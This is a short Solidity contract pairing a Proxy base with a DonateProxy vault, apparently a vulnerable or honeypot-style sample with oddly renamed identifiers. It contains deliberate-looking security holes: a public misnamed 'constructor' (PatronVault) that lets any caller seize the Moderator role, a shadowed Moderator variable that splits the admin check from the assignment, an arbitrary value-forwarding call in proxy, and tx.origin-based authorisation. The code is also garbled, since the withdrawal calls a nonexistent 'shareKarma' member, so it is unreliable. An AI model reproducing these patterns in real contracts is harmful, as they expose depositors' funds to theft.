pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyAdmin { if (msg.sender == Moderator) _; } address Moderator = msg.sender;
    function passinfluenceCommunitylead(address _moderator) public onlyAdmin { Moderator = _moderator; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract DonateProxy is Proxy {
    address public Moderator;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function PatronVault() public payable {
        if (msg.sender == tx.origin) {
            Moderator = msg.sender;
            donate();
        }
    }

    function donate() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function redeemKarma(uint256 amount) public onlyAdmin {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.shareKarma(amount);
        }
    }
}